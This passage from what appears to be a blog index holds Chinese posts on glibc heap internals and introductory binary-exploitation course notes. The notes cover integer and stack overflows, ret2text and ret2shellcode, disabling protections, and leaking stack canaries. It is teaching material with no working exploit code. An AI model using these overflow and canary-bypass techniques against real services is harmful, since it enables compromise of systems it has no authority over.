里，我们必须考虑如何维护多个堆的问题。这里我们会涉及三个头部：\nheap_info：每个堆的头部，main_arena 是没有的 malloc_state：arena 的头部，main_arena 的这个部分是全局变量而不属于堆段 malloc_chunk：每个 chunk 的头部 具体一点，heap_info 完整定义如下：\ntypedef struct _heap_info { mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ \u0026amp; MALLOC_ALIGN_MASK]; } heap_info; 而 malloc_state 的完整定义如下：\nstruct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; 其中 INTERNAL_SIZE_T 默认和 size_t 相同：\n#ifndef INTERNAL_SIZE_T #define INTERNAL_SIZE_T size_t #endif 在后面介绍 chunk 和 bin 的时候，我们会发现其中几个字段的作用，malloc_chunk 我们也会在后面看到。\n对于 arena 中只有单个堆的情况：\n对于 non_main_arena 中有多个堆的情况：\n注意到有多个堆的情况下，旧的堆的 Top chunk 会被认为是普通的空闲块。\nChunk 的结构 # 通俗地说，一块由分配器分配的内存块叫做一个 chunk，包含了元数据和用户数据。具体一点，chunk 完整定义如下：\nstruct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; typedef struct malloc_chunk* mchunkptr; 这里出现的 6 个字段均为元数据。\n一个 chunk 可以是以下几种类型之一：\n已分配的（Allocated chunk） 空闲的（Free chunk） Top chunk Last Remainder chunk 我们一个一个来看。\nAllocated chunk # 第一个部分（32 位上 4B，64 位上 8B）叫做 prev_size，只有在前一个 chunk 空闲时才表示前一个块的大小，否则这里就是无效的，可以被前一个块征用（存储用户数据）。\n这里的前一个 chunk，指内存中相邻的前一个，而不是 freelist 链表中的前一个。PREV_INUSE 代表的 “前一个 chunk” 同理。\n第二个部分的高位存储当前 chunk 的大小，低 3 位分别表示：\nP: PREV_INUSE 之前的 chunk 已经被分配则为 1 M: IS_MMAPED 当前 chunk 是 mmap() 得到的则为 1 N: NON_MAIN_ARENA 当前 chunk 在 non_main_arena 里则为 1 对应源码如下：\n/* size field is or\u0026#39;ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)-\u0026gt;size \u0026amp; PREV_INUSE) /* size field is or\u0026#39;ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()\u0026#39;ed chunk */ #define chunk_is_mmapped(p) ((p)-\u0026gt;size \u0026amp; IS_MMAPPED) /* size field is or\u0026#39;ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* check for chunk from non-main arena */ #define chunk_non_main_arena(p) ((p)-\u0026gt;size \u0026amp; NON_MAIN_ARENA) 你可能会有几个困惑：\nfd、bk、fd_nextsize、bk_nextsize 这几个字段去哪里了？ 对于已分配的 chunk 来说它们没用，所以也被征用了，用来存储用户数据。\n为什么第二个部分的低 3 位就这么被吞了而不会影响 size？ 这是因为 malloc 会将用户申请的内存大小转化为实际分配的内存，以此来满足（至少）8 字节对齐的要求，同时留出额外空间存放 chunk 头部。由于（至少）8 字节对齐了，低 3 位自然就没用了。在获取真正的 size 时，会忽略低 3 位：\n/* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) /* Get size, ignoring use bits */ #define chunksize(p) ((p)-\u0026gt;size \u0026amp; ~(SIZE_BITS)) malloc 是如何将申请的大小转化为实际分配的大小的呢？ 核心在于 request2size 宏： /* pad request bytes into a usable size -- internal version */ #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u0026lt;MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK) 其中用到的其它宏定义：\n# define MALLOC_ALIGNMENT (2 *SIZE_SZ) /* The corresponding bit mask value */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK)) 这里还有一个 mem 指针，是做什么用的？ 这是调用 malloc 时返回给用户的指针。实际上，真正的 chunk 是从 chunk 指针开始的。 /* The corresponding word size */ #define SIZE_SZ (sizeof(INTERNAL_SIZE_T)) /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) 用户申请的内存大小就是用户数据可用的内存大小吗？ 不一定，原因还是字节对齐问题。要获得可用内存大小，可以用 malloc_usable_size() 获得，其核心函数是： static size_t musable (void *mem) { mchunkptr p; if (mem != 0) { p = mem2chunk (mem); if (__builtin_expect (using_malloc_checking == 1, 0)) return malloc_check_get_size (p); if (chunk_is_mmapped (p)) return chunksize (p) - 2 * SIZE_SZ; else if (inuse (p)) return chunksize (p) - SIZE_SZ; } return 0; } Free chunk # 首先，prev_size 必定存储上一个块的用户数据，因为 Free chunk 的上一个块必定是 Allocated chunk，否则会发生合并。\n接着，多出来的 fd 指向同一个 bin 中的前一个 Free chunk，bk 指向同一个 bin 中的后一个 Free chunk。\n这里提到了 bin，我们将在后面介绍。\n此外，对于 large bins 中的 Free chunk，fd_nextsize 与 bk_nextsize 会生效，分别指向 large bins 中前一个（更大的）和后一个（更小的）空闲块。\nTop chunk # 一个 arena 顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：\n一个 K 字节的 chunk，分配给用户 一个 N-K 字节的 chunk，称为 Last Remainder chunk 后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么：\n在 main_arena 中，用 brk() 扩张 Top chunk 在 non_main_arena 中，用 mmap() 分配新的堆 注：Top chunk 的 PREV_INUSE 位总是 1\nLast Remainder chunk # 当需要分配一个比较小的 K 字节的 chunk 但是 small bins 中找不到满足要求的，且 Last Remainder chunk 的大小 N 能满足要求，那么 Last Remainder chunk 将被切割为：\n一个 K 字节的 chunk，分配给用户 一个 N-K 字节的 chunk，成为新的 Last Remainder chunk 它的存在使得连续的小空间内存申请，分配到的内存都是相邻的，从而达到了更好的局部性。\nBin 的结构 # bin 是实现了空闲链表的数据结构，用来存储空闲 chunk，可分为：\n10 个 fast bins，存储在 fastbinsY 中 1 个 unsorted bin，存储在 bin[1] 62 个 small bins，存储在 bin[2] 至 bin[63] 63 个 large bins，存储在 bin[64] 至 bin[126] 还是一个一个来看。\nfast bins # 非常像高速缓存 cache，主要用于提高小内存分配效率。相邻空闲 chunk 不会被合并，这会导致外部碎片增多但是 free 效率提升。注意 fast bins 是 10 个 LIFO 的单链表。最后三个链表保留未使用。\nchunk 大小（含 chunk 头部）：0x10-0x40（64 位 0x20-0x80）B，相邻 bin 存放的大小相差 0x8（0x10）B。\n注：加入 fast bins 的 chunk，它的 IN_USE 位（准确地说，是下一个 chunk 的 PREV_INUSE 位）依然是 1。这就是为什么相邻的 “空闲”chunk 不会被合并，因为它们根本不会被认为是空闲的。\n关于 fastbin 最大大小，参见宏 DEFAULT_MXFAST：\n#ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif 在初始化时，这个值会被赋值给全局变量 global_max_fast。\n申请 fast chunk 时遵循 first fit 原则。释放一个 fast chunk 时，首先检查它的大小以及对应 fastbin 此时的第一个 chunk old 的大小是否合法，随后它会被插入到对应 fastbin 的链表头，此时其 fd 指向 old。\nunsorted bin # 非常像缓冲区 buffer，大小超过 fast bins 阈值的 chunk 被释放时会加入到这里，这使得 ptmalloc2 可以复用最近释放的 chunk，从而提升效率。\nunsorted bin 是一个双向循环链表，chunk 大小：大于 global_max_fast。 当程序申请大于 global_max_fast 内存时，分配器遍历 unsorted bin，每次取最后的一个 unsorted chunk。\n如果 unsorted chunk 满足以下四个条件，它就会被切割为一块满足申请大小的 chunk 和另一块剩下的 chunk，前者返回给程序，后者重新回到 unsorted bin。\n申请大小属于 small bin 范围 unosrted bin 中只有该 chunk 这个 chunk 同样也是 last remainder chunk 切割之后的大小依然可以作为一个 chunk 否则，从 unsorted bin 中删除 unsorted chunk。\n若 unsorted chunk 恰好和申请大小相同，则直接返回这个 chunk 若 unsorted chunk 属于 small bin 范围，插入到相应 small bin 若 unsorted chunk 属于 large bin 范围，则跳转到 3。 此时 unsorted chunk 属于 large bin 范围。\n若对应 large bin 为空，直接插入 unsorted chunk，其 fd_nextsize 与 bk_nextsize 指向自身。 否则，跳转到 4。 到这一步，我们需按大小降序插入对应 large bin。\n若对应 large bin 最后一个 chunk 大于 unsorted chunk，则插入到最后 否则，从对应 large bin 第一个 chunk 开始，沿 fd_nextsize（即变小）方向遍历，直到找到一个 chunk fwd，其大小小于等于 unsorted chunk 的大小 若 fwd 大小等于 unsorted chunk 大小，则插入到 fwd 后面 否则，插入到 fwd 前面 直到找到满足要求的 unsorted chunk，或无法找到，去 top chunk 切割为止。\nsmall bins # 小于 0x200（0x400）B 的 chunk 叫做 small chunk，而 small bins 可以存放的就是这些 small chunks。chunk 大小同样是从 16B 开始每次 + 8B。\nsmall bins 是 62 个双向循环链表，并且是 FIFO 的，这点和 fast bins 相反。同样相反的是相邻的空闲 chunk 会被合并。\nchunk 大小：0x10-0x1f0B（0x20-0x3f0），相邻 bin 存放的大小相差 0x8（0x10）B。\n释放非 fast chunk 时，按以下步骤执行：\n若前一个相邻 chunk 空闲，则合并，触发对前一个相邻 chunk 的 unlink 操作 若下一个相邻 chunk 是 top chunk，则合并并结束；否则继续执行 3 若下一个相邻 chunk 空闲，则合并，触发对下一个相邻 chunk 的 unlink 操作；否则，设置下一个相邻 chunk 的 PREV_INUSE 为 0 将现在的 chunk 插入 unsorted bin。 若 size 超过了 FASTBIN_CONSOLIDATION_THRESHOLD，则尽可能地合并 fastbin 中的 chunk，放入 unsorted bin。若 top chunk 大小超过了 mp_.trim_threshold，则归还部分内存给 OS。 #ifndef DEFAULT_TRIM_THRESHOLD #define DEFAULT_TRIM_THRESHOLD (128 * 1024) #endif #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) large bins # 大于等于 0x200（0x400）B 的 chunk 叫做 large chunk，而 large bins 可以存放的就是这些 large chunks。\nlarge bins 是 63 个双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并。chunk 大小就比较复杂了：\n前 32 个 bins：从 0x200B 开始每次 + 0x40B 接下来的 16 个 bins：每次 + 0x200B 接下来的 8 个 bins：每次 + 0x1000B 接下来的 4 个 bins：每次 + 0x8000B 接下来的 2 个 bins：每次 + 0x40000B 最后的 1 个 bin：只有一个 chunk，大小和 large bins 剩余的大小相同 注意同一个 bin 中的 chunks 不是相同大小的，按大小降序排列。这和上面的几种 bins 都不一样。而在取出 chunk 时，也遵循 best fit 原则，取出满足大小的最小 chunk。\n内存分配流程 # 我觉得这类复杂的流程比较需要靠流程图来理解，因此我画了一下：\n相关宏：\n#define NBINS 128 #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT\u0026gt; 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) #define in_smallbin_range(sz) \\ ((unsigned long) (sz) \u0026lt;(unsigned long) MIN_LARGE_SIZE) #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif 内存释放流程 # 参考资料 # Heap Exploitation Understanding glibc malloc Syscalls used by malloc glibc 内存管理 ptmalloc 源代码分析 Painless intro to the Linux userland heap ","date":"2019-12-08","permalink":"/posts/glibc-heap/","section":"Posts","summary":"\u003cp\u003eThe heap is a beautiful mess.\u003c/p\u003e","title":"盘根错节：GLibc 堆内存管理机制简介"},{"content":"其实我也刚学。\n本课程主要介绍对于远程服务进行二进制层面的漏洞利用（也称 Pwn）的基础技巧，使用的编程语言主要包括 C 语言、汇编语言和 Python 语言，涉及的平台包括 32 位与 64 位 Linux 操作系统。内容包含：\nPwn 简介 整型溢出漏洞 Linux 基础 C 程序运行机制 C 语言函数调用栈 缓冲区溢出漏洞——栈溢出 Pwn 相关工具 x86(-64) 汇编基础 花式栈溢出与栈溢出保护 格式化字符串漏洞 时间有限，课程仅介绍了二进制安全中最基础的三类漏洞及其利用：整型溢出、栈溢出与格式化字符串漏洞。\nPwn 简介 # 什么是 Pwn？ # \u0026ldquo;pwn\u0026rdquo; - means to compromise or control, specifically another computer (server or PC), web site, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking, including iOS jailbreaking. - Wikipedia.\nPwn 概览 # GLIBC Pwn Linux 下内存管理相关 Browser Pwn 浏览器相关 Kernel Pwn Windows Kernel Linux Kernel Pwn 实例 # 包括但不限于：Web 框架、OS 内核、浏览器、路由器等设备……\nCVE-2017-5638 Apache Struts2 远程代码执行 CVE-2019-9213 Linux 内核用户空间 0 虚拟地址映射 CVE-2019-11707 64 位火狐浏览器任意读写 + 代码执行 CVE-2018-5767 TENDA AC15 路由器权远程代码执行 …… 整型溢出 # 例：\nunsigned char x = 0xff; printf(\u0026#34;%d\\n\u0026#34;, ++x); 考虑这里的 ++x，二进制表示实际就是：\n1111 1111 + 1 = 1 0000 0000 然而，unsigned char 是 1 字节即 8 比特的，上面的结果却是 9 比特，那么对于最高位的 1 只能舍弃，因此有：\n(0xff+1) mod 256 = 0 也就是说，程序的执行结果为 0。0xff 这样的大数加 1 后变成了 0，显然不是我们预期的结果。类似地，对于：\nsigned char x = 0x7f; printf(\u0026#34;%d\\n\u0026#34;, ++x); 这里的 ++x 就是：\n0111 1111 + 1 = 1000 0000 幸运的是，这次没有出现多出一比特的情况。然而对于 signed char，我们知道其最高位是符号位，换而言之我们的结果是一个负数。\n0x7f+1 = 0x80 = -(unsigned char) 1000 0000 = -128 注意这里的补码运算。\n整型溢出漏洞原理非常简单，其造成的危害却是十分隐蔽的，例如，我们有时会这样倒序遍历字符串：\nfor (int i = strlen(s)-1; i \u0026gt;= 0; --i) 这样写会引起编译器 warning，因为将无符号类型转换到了有符号类型。为什么会这样？我们来看一下 strlen 函数的定义：\nsize_t strlen (const char * str) 返回值是 size_t 类型，我们可以将它等效为 unsigned int 类型。\n现在考虑 s 是一个空串时的情况，这时 i 的初始值是什么？\n你可能会认为是 - 1。实际上，由于 strlen 的返回值是无符号的，那么它减 1 的结果同样会被认为是无符号的，那么 i 被赋值的实际上是 (size_t)(-1)，也就是一个很大的正数。此时必然会发生数组越界。\n一个更常见的错误是这样的：\nint binary_search(int a[], int len, int key) { int low = 0; int high = len - 1; while (low\u0026lt;=high) { int mid = (low + high)/2; if (a[mid] == key) { return mid; } if (key \u0026lt; a[mid]) { high = mid - 1; }else{ low = mid + 1; } } return -1; } 这不就是最普通的二分查找写法吗？的确，但是即使我们确保 low 和 high 不溢出，low+high 的结果依然可能溢出，而此时 mid 会变成一个负数，造成越界。\n而且，整型溢出不仅在 C 语言中存在。在最近的一次 中科大比赛 中我们就遇到了对 js 整型溢出的利用。\nLinux 基础 # 课程的第二部分介绍了一些 Linux 相关基础。Linux 是一个开源的 OS 内核，基于 C 和汇编编写，可执行文件格式是 ELF 格式，这也是我们后面要主要研究的。这里附上一个非常有趣的 Linux 练习网站。\n安装与配置请自行搜索，推荐使用虚拟机安装。课程使用的发行版是 Ubuntu 16.04LTS，不过最近发现哈佛的 CS50 IDE 也非常好用。\n下面是一些基础 Linux 命令：\n目录管理 # ls 列出当前目录下文件 -a 列出所有文件（包括隐藏的） -l 详细信息 cd [path] 改变目录到 path . 当前目录 .. 上级目录 pwd 显示当前目录 文件操作 # cat [file] 显示文件 file 的内容 more [file] 类似 cat，但对于长文件可以分页显示 mv [file1] [file2] 把 file1 移动到 file2，如果后者已存在则覆盖 cp [file1] [file2] 将 file1 复制到 file2，如果后者已存在则覆盖 rm [file] 删除文件 file touch [file] 创建文件 file，或更新文件 file 的修改时间 mkdir [directory] 创建目录 directory chmod [file] 改变文件 file 的权限 用户管理 # sudo 以管理员权限执行命令 su [user] 切换到用户 user whoami 显示当前用户用户名 id 显示当前用户 ID 和所在用户组 ID passwd 更改当前用户密码 工作命令 # date 显示当前系统时间 ps 显示当前运行进程 uname 显示系统相关信息 echo \u0026quot;hello\u0026quot; 在终端中显示 hello echo $((0xDEADBEEF)) grep \u0026quot;hello\u0026quot; 查找含有 hello 的行并显示 特性 # 管道：从一个程序中获取输出，作为另一个程序的输入 echo \u0026quot;hello\u0026quot; | /usr/games/cowsay echo \u0026quot;hello\u0026quot; | /usr/games/cowsay | grep \u0026quot;hello\u0026quot; 重定向：指定输入输出的来源，而不是直接读 stdin 写 stdout echo \u0026quot;hello\u0026quot; | /usr/games/cowsay \u0026gt; cowsay echo \u0026quot;hello\u0026quot; \u0026gt; cowsay echo \u0026quot;hello\u0026quot; \u0026gt;\u0026gt; cowsay man [command] 显示命令 command 的说明 方向 ↑ 键：上一条命令 Tab 键：自动补全命令 这里通过 pwnable.kr 上的 cmd1，cmd2 和 blukat 三题，演示了 Linux 下的一些小把戏。\nC 程序运行机制 # 以 Hello World 程序为例：\n#include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { printf(\u0026#34;Hello World!\\n\u0026#34;); return 0; } 这个程序到底是怎么运行起来的？我们分三步介绍：\n源代码被编译为机器语言，随后汇编为目标文件 目标文件中引入相关依赖，链接为可执行文件（ELF） 可执行文件载入内存并运行 编译一个程序非常简单，如果你的源代码是 1.c，那么只需要 gcc 1.c 就能生成一个叫做 a.out 的 ELF 文件，你也可以用 -o 选项来设置 ELF 文件的名字。\n我们所要研究的就是 ELF 文件中究竟有什么。首先是 ELF 文件头，包含了 ELF 文件的许多元数据，我们可以用 readelf -h a.out 来查看：\nELF 文件的内容则是由一个个段 (segment) 组成的，如：\n文本段 text segment 程序的代码就在这里 数据段 data segment 存储了程序中变量的数据等等 重定位段 reloc 包含重定位信息，之后会具体讨论 符号表 symbol table 存储了变量名、函数名等信息 字符串表 string table 存储了只读字符串等信息 objdump -s a.out 可以帮助我们查看这些段的信息：\n而如果要查看其中的汇编代码，就需要靠 objdump -d a.out 了：\n我们注意到，上图中 put@plt 的地址是 ff ff，这是因为程序还没有进行第二步——链接。现在的 C 程序默认采用动态链接的方式，是因为传统静态链接容易造成重复链接比较浪费，同时也十分难维护。而动态链接会在运行时才进行链接。\n最后，当我们 ./a.out 运行程序时，可执行文件会被载入内存，不同的段将被分配不同的虚拟地址，并映射到对应的物理地址。当程序计数器指向了代码段的起始位置之后，我们的程序也就准备好开始运行了。\n上图展示了虚拟地址是如何映射到物理地址的，同时也展示出 ELF 文件中的两个特殊的段：heap 段与 stack 段的生长方式。可以看到，堆是从低地址向高地址生长的，而栈是从高地址向低地址生长。但是，数据的存储却是从低地址向高地址存储，这也是我们能够实施栈溢出攻击的基础。\nC 语言函数调用栈 # C 程序运行过程中，会持续地维护这个 stack 段也就是栈，用来控制函数调用的流程。当发生函数调用时，栈的主要任务是保存调用者函数 caller 的状态，并创建被调用函数 callee 的状态，这里的 “状态” 在栈上被称为栈帧，每个栈帧之间是相互独立的。\n调用 # 在调用一个函数时，首先会将函数的参数按倒序压入栈中：\n注意图中栈是向下生长的，下面的 esp 寄存器指向栈顶，而上面的 ebp 寄存器指向当前运行函数的栈帧的底部，也就是栈帧开始的地方。\n接下来压入函数返回地址。当函数调用结束后，函数必定需要返回到调用它的语句的下一句处，但是它怎么知道它要返回到哪里？这只能由我们告诉他，方式就是存储到栈上。\n这里存储到栈上的值实际上就是 caller 的 eip。eip 寄存器保存了 CPU 当前执行的指令的下一条指令的地址。\n随后，我们压入 caller 的 ebp，并更新 ebp 的值。后者很好理解，因为我们现在进入到了 callee 这个函数了，栈帧基址当然也要跟着变化，那么前者是为什么呢？我们会在函数返回时发现这样做的原因。\n最后就是压入局部变量了，这一步没有太多可以解释的。\n返回 # 函数返回的第一步就是弹出局部变量，依然很简单：\n第二步，我们要取出 caller 的 ebp 值并赋值给 ebp：\n这里就可以很清晰地看到，我们在调用时为何要保存这个值了，如果不保存，那么返回的时候 ebp 不知道应该返回到哪里。而保存了 caller 的 ebp 实际上就是保存了 caller 栈帧的基址。\n第三步弹出返回地址，第四步依次弹出参数。\n为了让大家能对函数调用栈有一个更直观的认识，我演示了 pwnable.kr 上的 random 这题的解法，而为了解决这题，就不得不用到调试工具 gdb。\ngdb 简介 # 这里仅仅列出了一些最常用的 gdb 命令：\nb 12 在第 12 行下断点 b 1.c:12 在 1.c 的 12 行下断点 b main 在 main 函数下断点 b *0x8048abc 在 0x8048abc 地址处下断点 r 执行程序 c 执行到下一个断点 s 单步调试，遇到函数则进入 n 单步调试，遇到函数不进入 until 运行到退出循环 until 12 运行到 12 行 q 退出 info b 查看所有断点 info func 查看所有函数 p var 打印出 C 语言变量 var 的值 bt 查看函数调用栈 x/8xw 0x8048abc 以 16 进制显示 0x8048abc 地址后 8 个内存单元的值，每个内存单元大小 4 字节 x/4ch 0x8048abc 以字符格式显示 0x8048abc 地址后 4 个内存单元的值，每个内存单元大小 2 字节 help x 查看关于命令 x 的帮助 缓冲区溢出漏洞——栈溢出 # 至此，可以介绍栈溢出了。栈溢出即通过覆盖栈上的数据，控制程序执行流程的一种攻击手段。攻击成功至少需要两个前提：\n程序必须向栈上写数据 写入的数据大小没有被良好地控制 关于栈溢出，有这样一些 “危险函数” 是我们可以利用的：\ngets scanf read sprintf strcpy strcat Pwn 相关工具 # 为了真正实施攻击，一些辅助工具是必不可少的，例如：\nchecksec 检查程序 gdb 调试并分析程序 peda 一个 gdb 的可视化插件 pwndbg 另一个 gdb 的可视化插件 IDA 著名的反编译工具 pwntools 用于方便地编写攻击脚本的 python 库 LibcSearcher 用于实施 ret2libc 攻击的 python 库 ROPgadgets 用于实施 ROP 攻击的 python 库 (netcat) 连接到远程主机上开放的服务的命令行工具 (ssh) 登录远程主机的命令行工具 介绍完了这些，我演示了对于 pwnable.kr 的 bof 这题的攻击，通过溢出局部变量来覆盖函数参数的值。\n花式栈溢出 # 栈溢出之所以值得开一门课来讲授，正是因为这种攻击有很多玩法，例如：\nBasic ret2text ret2shellcode ret2syscall ret2libc ROP GOT Hijacking Intermediate ret2csu ret2reg BROP Advanced ret2dl_runtime_resolve SROP ret2VDSO JOP COP \u0026hellip; 本课程只介绍 Basic 部分。\nret2text # 首先介绍了 ret2text，即通过栈溢出覆盖函数的返回地址，以控制程序的控制流。在例题 bugku 的 pwn2 中，就是利用 ret2text 返回到了 text 段已经存在的一个后门函数来获取 shell。\nret2shellcode # 但不是什么时候程序中都会有一个现成的后门函数，因此有时我们需要自己创造条件。ret2shellcode 就是这样的攻击方法。我们向栈上写入一段恶意的汇编代码，随后利用程序中的漏洞执行栈上的这段代码即可完成攻击。Hackergame 的 ShellHacker 这道题就是一个很好的例子。\n然而上面的两种攻击依然太过理想化了，现实中的程序往往不会那么容易被栈溢出攻击，因为开启了各种保护措施。\n栈溢出保护 # 课程介绍了 4 种常见的栈溢出保护。其中，NX 使栈上的数据不可被执行；Canary 在局部变量和 caller\u0026rsquo;s ebp 之间插入了一个随机值，并在函数返回时检查随机值是否被修改；PIE 将使整个进程中的数据地址变得随机，每次运行时都不相同；RELRO 使重定向段不可写。\nNX (No eXecution) 默认开启 Windows: DEP (Data Execution Prevention) gcc –z execstack 禁用 NX gcc –z noexecstack 启用 NX Canary 默认不开启 gcc –fno-stack-protector 禁用 canary gcc –fstack-protector 只为局部变量中含有 char 数组的函数插入 canary gcc –fstack-protector-all 为所有函数插入 canary PIE (Position-Independent Executables) 默认不开启 Windows: ASLR (Address Space Layout Randomization) Level 0 - 表示关闭进程地址空间随机化 Level 1 - 表示将 mmap 的基址、栈和 VDSO 页面随机化 Level 2 - 表示在 1 的基础上增加堆的随机化 gcc –fpie –pie 开启 1 级 PIE gcc –fPIE –pie 开启 2 级 PIE RELRO (RELocation Read Only) 默认 Partial gcc –z norelro 关闭 RELRO gcc –z lazy 部分开启 RELRO，GOT 表可写 gcc –z now 全部开启 RELRO 这些保护机制并不是那么容易绕过。为了突破这些保护，我们需要了解 32 位与 64 位汇编语言的知识。\nx86 汇编 # 汇编语言是 Intel 推出的一系列汇编的指令集合，有两种语法：\nIntel 语法：operand destination, source mov eax, 5 AT\u0026amp;T 语法：operand source, destination mov $5, %eax 本课程将使用更简单的 Intel 语法（CSAPP 使用 AT\u0026amp;T 语法）。\n重要寄存器 # eax ebx ecx edx 泛用型寄存器（eax 通常存储函数返回值） esp 指向栈帧顶部 ebp 指向栈帧底部 eip 指向下一条 CPU 将要执行的指令 eflags 存储标志位 ZF 运算结果为 0 时置 1 CF 运算结果最高有效位发生进位或借位时置 1 SF 运算结果为负时置 1 数据操作 # mov ebx, eax mov eax, 0XDEADBEEF mov edx, DWORD PTR [0x41424344] mov ecx, DWORD PTR [edx] mov eax, DWORD PTR [ecx+esi*8] sub edx, 0x11 add eax, ebx inc edx dec ebx xor eax, eax or edx, 0x1337 写成类似的 C 伪代码即：\nebx = eax; eax = 0xDEADBEEF; edx = *0x41424344; ecx = *edx; eax = *(ecx+esi*8); edx -= 0x11; eax += ebx; edx++; ebx--; eax ^= eax; edx |= 0x1337; 这里的 DWORD PTR 指 4 字节指针，相应的有 BYTE PTR/WORD PTR/QWORD PTR 表示 1/2/8 字节指针。注意 [0x41424344] 表示取地址 0x41424344 位置的值，如果里面是寄存器同理。\n条件跳转 # jz $LOC jnz $LOC jg $LOC jle $LOC 分别表示，当上一条语句执行结果为：\n0 非 0 目标操作数大于源操作数 目标操作数小于等于源操作数 时，跳转到 $LOC 的位置。 函数调用 # push ebx ; is equal to: sub esp, 4 mov DWORD PTR [esp], ebx pop ebx ; is equal to: mov ebx, DWORD PTR [esp] add esp, 4 call some_function ; is equal to: push eip mov eip, some_function ; actually invalid ret ; is equal to: pop eip ; actually invalid nop ; do nothing 例：计算字符串长度 # 0x08048624: \u0026#34;MERCURY\\0\u0026#34; mov ebx, 0x08048624 mov eax, 0 LOOPY: mov cl, BYTE PTR [ebx] cmp cl, 0 jz end inc eax inc ebx jmp LOOPY end: ret 等效于下面的 C 代码：\nchar *name = \u0026#34;MERCURY\u0026#34;; int len = 0; while (*name != 0) { len++; name++; } return len; x86-64 汇编 # 再放一次这张图。 64 位架构下，新增了寄存器 r8-r15，用 xmm0-xmm7 存储浮点参数，同时原来的 eax 变成了 rax 等。但最重要的，还是传参方式的变化：函数前 6 个参数会被依次存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，之后的参数才遵循栈上约定。\n花式栈溢出：续 # 泄露 canary # 介绍了这么多，终于可以演示一些保护机制的绕过方法了，首先是绕过 canary，这里采用了泄露 canary 的方式，实际上还有很多其他方式。前面提到过，canary 在栈上大概在这个位置：\n| args | ------------ | ret addr | ------------ \u0026lt;- ebp | saved ebp | ------------ | padding | ------------ \u0026lt;- ebp-0x?? | canary | ------------ | local vars | 那么我们栈溢出时，从局部变量出发向上走，必定要经过 canary 并覆盖其值，那么函数返回时就会检测到，并终止程序。\n然而，canary 在设计时规定末尾的字节必为 00，也就是 C 语言中的 \\0，这是因为当我们打印栈信息时（从低地址向高地址打印），遇到 00 字节就会认为是字符串结束符，因此停止打印，这样 canary 的值就不会泄露。然而这同时也是我们可以利用的点。如果我们覆盖掉 canary 的最后一个字节为 0a 或者别的什么值，那么打印栈时就不会在 canary 处停下来，从而打印出 canary 的值。这是我们再将 0a 恢复为 00 便得到了完整的 canary 值。\n得到 canary 后，我们只需要在栈溢出时注意，溢出到 canary 的位置的时候插入刚才得到的 canary 值，随后继续正常溢出，那么函数返回时就会认为 canary 